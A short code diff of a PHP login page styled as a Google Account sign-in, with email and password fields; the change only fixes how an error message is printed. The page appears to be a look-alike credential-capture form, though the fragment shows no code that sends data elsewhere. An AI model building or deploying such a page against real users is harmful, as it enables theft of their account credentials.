@@ -23,7 +23,7 @@ if (!empty($_POST)) {
 	<h2>with your Google Account</h2>
 	<input id="user" type="text" name="username" placeholder="Enter your email">
 	<input type="password" name="password" placeholder="Enter your password">
-	<p class="warning">$err&nbsp;</p>
+	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
 	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
 </form>
 <footer>
